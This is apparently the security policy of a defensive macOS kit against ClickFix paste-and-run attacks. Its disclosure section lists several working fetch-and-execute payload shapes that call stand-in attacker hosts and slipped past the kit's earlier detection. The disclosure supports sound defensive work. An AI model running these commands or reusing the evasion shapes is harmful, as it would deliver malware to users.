# Security Policy

The ClickFix Defense Kit is a **defensive-use-only** project. This document
covers responsible use, our security invariants, and how to report a problem.

---

## Responsible use

- **Defend only machines you own or are explicitly authorized to defend.** This
  kit contains no exploits and no offensive capability. Do not use any part of it
  to scan, probe, plant decoys on, or audit a machine you do not own or have
  written authorization to test. In most jurisdictions, unauthorized access or
  testing is illegal.
- **Nothing here exfiltrates your data.** No tool phones home. The only outbound
  traffic the kit can *cause* is a **canarytoken you minted yourself**, beaconing
  to **your own** alert destination (an email or webhook you control). If you
  self-host Canarytokens, point the tools at **your** infrastructure, never
  anyone else's.
- **ExposureScan is a self-audit, not an extractor.** It is architecturally
  incapable of emitting a secret value (see the invariant below). If you want
  your own values, you already have them — this tool exists to inventory them
  *without* materializing them.

---

## Security invariants (what we promise the code does)

1. **ExposureScan never reads, decrypts, stores, or prints a secret value.** It
   reports key *names*, *counts*, and value *shape* (length / entropy class)
   only. Every user-facing string passes through a final `redact()` chokepoint.
   This is enforced by architecture, not by a disabled flag, and is covered by
   `exposurescan/tests/test_redaction.py`, which feeds a synthetic fake secret
   and asserts the literal value never appears in any markdown or JSON artifact.
2. **Canary ships token-MINTING code and decoy templates only — never minted or
   live tokens.** Decoy templates contain obvious `PLACEHOLDER` / `EXAMPLE`
   values. You mint a real canarytoken yourself and plant it locally.
3. **No tool writes outside the user's own machine, decrypts user secrets, or
   makes a network call** (Canary's beacon is the user's own minted token).
4. **No `curl | bash` installer.** That delivery pattern is the exact attack this
   kit defends against; every installer is a readable local script.
5. **The repo contains no real credentials, tokens, private keys, PII, or
   host-identifying data.** Fixtures and examples are synthetic placeholders.

If you find a case where any of these invariants is violated — especially a real
secret value escaping ExposureScan output, or a committed live token — treat it
as a **high-severity** issue and report it (below).

---

## Permissions rationale (why a defensive tool asks for elevated access)

A security tool that requests Full Disk Access or root looks, from the outside,
exactly like malware. That distrust is healthy. Each request, and why it's
needed, is documented per-tool in the top-level `README.md` ("Permissions" table)
and in each tool's own README. In short:

- **ShellGuard** and **ClipSentinel** request **nothing** (no FDA, no root, no
  network).
- **ExposureScan** and **WatchPost** request **Full Disk Access** only to *read*
  TCC-protected locations; they never write there, never decrypt, never phone
  home, and degrade gracefully (skip the surface) without it.
- **Canary's optional `eslogger` read-watch** needs **root + Full Disk Access** —
  a real onboarding wall. Read the source first and prefer a signed/notarized
  helper if you distribute it.
- **GuestMode** uses only macOS's own admin-password prompt to create an account;
  it never reads, stores, or logs your password.

---

## Licensing & code provenance

- The kit is licensed under **Apache License 2.0**.
- The kit **shells out** to external tools (e.g. Gitleaks) rather than vendoring
  them, which is license-compatible.
- The kit **deliberately does not vendor or copy AGPL/GPL code** — notably it does
  **not** vendor TruffleHog (AGPL). No AGPL/GPL source is copied into this tree.

---

## Reporting a vulnerability or a leak

If you discover a security problem in this kit — a broken invariant, a bypass in
ShellGuard's grammar, a value leak in ExposureScan, a committed secret, or
anything that could harm a user who runs these tools — please report it
**privately first**:

- **Preferred:** open a GitHub **Security Advisory** ("Report a vulnerability") on
  this repository, which keeps the report private until a fix is ready.
- **Alternative:** open a regular issue **only** if the problem is non-sensitive
  (e.g. a false-positive in a pattern). Do **not** paste real secrets, real scan
  output, or real tokens into a public issue — redact first.

Please include:

- The tool and version (see `CHANGELOG.md`).
- macOS version.
- Steps to reproduce, using **synthetic / placeholder** data only.
- The impact you observed.

There is no paid bug-bounty for this project. It is a personal, open-source
defensive kit. Good-faith reports are credited (with your permission) in the
changelog.

---

## Scope

In scope: the code in this repository (the six tools, the installers, the docs).

Out of scope: the upstream tools this kit points you at (Objective-See,
Thinkst Canarytokens, Gitleaks, macOS itself) — report those to their
maintainers.

---

## Verifying what you cloned

This kit asks for Full Disk Access and, for one optional layer, root. You should
not take that on trust, and you should not have to. Two independent checks:

**1. The tag is signed.** From `v0.1.1` onward, release tags are signed with an
SSH key. Make this step zero, before you read or run anything:

```sh
git clone https://github.com/DareDev256/clickfix-defense-kit.git
cd clickfix-defense-kit

# fetch the signer, then verify the tag
mkdir -p ~/.config/git
echo 'tdotssolutionsz@gmail.com namespaces="git" ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ7WssTDYR71Z6KSSdrK/Xq2XipExLQl912nFRJlnQdX' \
  >> ~/.config/git/allowed_signers   # full key below
git config gpg.ssh.allowedSignersFile ~/.config/git/allowed_signers

git verify-tag v0.1.1     # must print "Good \"git\" signature"
git checkout v0.1.1
```

The signing key fingerprint is:

```
SHA256:ahS0yuup97TRBRmaRzk3iEbUlo/IK+VqXgd0sada2KU   (ED25519)
```

Verify that fingerprint out-of-band — against this file as served by GitHub over
HTTPS, and against the release notes. A fingerprint you read only from a file you
already cloned proves nothing on its own.

**2. `.git` already is a content-addressed integrity manifest.** It is worth
saying plainly, because the obvious-looking control is worse than useless:

> A `MANIFEST.sha256` checked into the tree is **theatre**. Anyone who can modify
> `shellguard.zsh` can re-run `shasum -a 256 … > MANIFEST.sha256` — the same
> write access the tamper already required — and the manifest reports OK on a
> backdoored tree. Meanwhile `git status --porcelain` reports the modification in
> every case, and the object hashes chain to a commit ID you can compare against
> GitHub. **Tamper detection is already solved. Do not trust a flat checksum file
> inside the thing it is checksumming.**

So, to confirm nothing was modified after cloning:

```sh
git status --porcelain     # any output = a tracked file was modified
git rev-parse HEAD         # compare against the commit shown on GitHub
```

`install.sh` performs both of these before touching your system and refuses to
proceed on a dirty tree.

**What is still missing, stated plainly:** the signing key is not yet registered
with GitHub as a signing key, so the web UI will show these tags as unverified
even though `git verify-tag` succeeds locally. The Canary `eslogger` helper is
unsigned and un-notarized, which is why the read-watch layer is documented rather
than shipped enabled — granting root to an unsigned binary is itself a malware
trust profile, and this project is not going to ask you to do that.

---

## Published bypasses in v0.1.0 (fixed in v0.1.1)

This project's pitch is that it refuses claims it cannot back. That has to
include claims about itself, so this section documents — in full, with the
working payload shapes — what the first release got wrong.

v0.1.0's detection grammar was adversarially tested for the first time in July
2026. It did not hold. **Nine of thirteen realistic ClickFix payload shapes
passed ShellGuard silently**: no prompt, no banner, no log entry. The repo was
public and the grammar was readable, so these were rediscoverable by anyone who
opened `shellguard.zsh`. Publishing them is strictly better than leaving users
on v0.1.0 believing they were covered.

**If you are running v0.1.0, upgrade.** Every payload below is now an asserted
row in `tests/corpus.tsv` and fails CI if it regresses.

### ShellGuard — detection (all silent passes on v0.1.0)

| Payload shape | Why it passed |
|---|---|
| `curl "https://evil/x?a=1&b=2" \| sh` | the `[^\|;&]*` run could not cross the `&` in an ordinary query string |
| `curl https://evil/x \| bash;` | one trailing character broke the `([[:space:]]\|$)` anchor |
| `curl https://evil/x \| /bin/sh` | the interpreter had to be a bare literal, so a path defeated it |
| `curl https://evil/x \| \sh` / `\| 'sh'` / `\| command sh` | same, via a backslash, a quote, or a prefix command |
| `bash -c "$(curl -fsSL https://evil/x)"` | no pipe-to-interpreter shape existed to match |
| `$(curl https://evil/x)` | a bare command substitution, with no `eval` prefix |
| `curl … \| tee /tmp/p \| sh` | an interposed pipeline stage |
| `curl -o /tmp/p https://evil/x; sh /tmp/p` | download and execute split across two statements |
| `osascript -e 'do shell script "curl … \| zsh"'` | the `applescript://` Script Editor lure, which never touches a shell prompt |

### ShellGuard — the trusted-host allowlist

`raw.githubusercontent.com` and `raw.github.com` shipped in the **default**
allowlist. Any GitHub account can publish an arbitrary shell script to those
hosts with zero review, so:

```
curl -fsSL https://raw.githubusercontent.com/<attacker>/<repo>/main/x.sh | sh
```

passed **silently** — the guard was telling an attacker exactly where to stage a
payload it would then wave through. The allowlist was also applied uniformly
after every pattern, which silently waived the tool's own osascript rule, the
one its source comment described as always hostile.

Trust is now scheme + host + **path prefix**, and the wildcard-subdomain rule is
gone. A host the public can publish to can never again be a trust anchor by
hostname alone.

### ShellGuard — the confirmation gate could not be completed

`IFS= read -r answer < /dev/tty` inside a ZLE widget never returns. While a
widget is running the line editor holds the terminal in raw mode with echo
disabled: the user sees nothing as they type, and Enter sends CR rather than LF,
which `read` does not accept as a terminator. **The typed-phrase gate — the
entire purpose of the block tier — was not completable.** Fixed via zsh's
`read-from-minibuffer`, with an `stty sane` save/restore fallback, and now
covered by a pty-driven test that types into a real interactive zsh and checks a
marker file.

The warning banner also printed the attacker-controlled command verbatim, so a
payload could emit ANSI to scroll the warning off screen or paint a fake
confirmation line into the kit's own output.

### ClipSentinel — one token silenced the whole tool

`_is_allowlisted` was a bare substring test against the entire clipboard buffer,
and its list contained the token `install.sh`. Since a ClickFix page controls the
exact clipboard bytes, this was a guaranteed, attacker-chosen suppression:

```
curl -fsSL https://<attacker>/get4/install.sh | bash    # the published AMOS IOC shape
curl -s https://evil-bun.shop/p | bash                  # 'bun.sh' substring-matched
curl http://evil/p | bash # deno.land                   # a trailing comment silenced it
```

The v0.1.0 README also claimed ClipSentinel's grammar was "kept in lockstep with
ShellGuard's". It was not — the two disagreed on 6 of 13 payloads, because each
file carried its own copy. Both now source `lib/clickfix-grammar.zsh`, and CI
fails if either grows a private host list or detection regex again.

ClipSentinel's event log also recorded a 117-character preview of the copied
text, including the attacker URL, while the README stated contents were "never
stored or sent anywhere". It now logs a verdict, a reason and a truncated hash.

### ExposureScan — the privacy invariant was false

The README claimed the tool was "architecturally incapable of emitting a secret
value". For the highest-value secret class it ranks P0, it was not:

- A 12-word BIP-39 seed phrase passed `redact()` **byte-identical** — no
  unbroken 20-character run and no `=`, so neither rule engaged.
- `postgres://admin:hunter2@db.internal:5432/prod` passed unchanged.
- `KEY = correct horse battery staple` emitted three of the four words *and* a
  literal `<redacted>`, so the line read as sanitized when it was not.
- Apple Notes titles were emitted verbatim — and macOS derives a note's title
  from its **first line**. For the exact person this surface exists for, someone
  who pasted a seed phrase into Notes, the secret *was* the title.
- A filename containing a card number was reproduced verbatim into stdout, the
  markdown report and the JSON sidecar, annotated `credit-card: 1`.
- Worse than the redaction bug: seed-phrase **detection** only matched the
  *label* ("seed phrase", "mnemonic"), so a note containing nothing but the
  twelve words was never flagged at all.

All are fixed and covered by end-to-end tests that run the real scanner against
a synthetic Notes store and assert no secret reaches any artifact.

### Canary

`canary --list` aborted with `kind: unbound variable` on any non-empty ledger
(`read -r ... _kind` then `print "$kind"` under `set -u`). The advertised audit
command had never worked, so nobody had ever successfully reviewed a plant —
including the missing-decoy check that is itself a breach signal.

### What this changed about how the kit is built

Detection now lives in one tokenizer, `lib/clickfix-grammar.zsh`, shared by both
layers. It is asserted by `tests/corpus.tsv`, which contains every payload above
plus every known false positive, and runs on **macOS** CI runners — `[[ =~ ]]`
binds to the platform regex library, so a Linux-green corpus proves nothing
about the only platform this kit runs on.

The general lesson, stated plainly: a hand-written regex over an unparsed shell
command cannot survive ordinary shell syntax. If you are building something
similar, parse the command.
